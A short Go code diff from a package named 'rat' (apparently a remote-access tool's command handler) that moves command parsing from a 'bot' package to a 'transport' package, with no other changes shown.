@@ -1,7 +1,7 @@
 package rat
 
 import (
-	"dtrat/bot"
+	"dtrat/transport"
 
 	"github.com/deuterium34/dlog"
 )
@@ -40,7 +40,7 @@ func (r *Rat) commandHandling() error {
 }
 
 func (r *Rat) commandsSwitch(text string) {
-	cmd, args := bot.ParseCommand(text)
+	cmd, args := transport.ParseCommand(text)
 	switch cmd {
 	case "start":
 		r.startCmd()
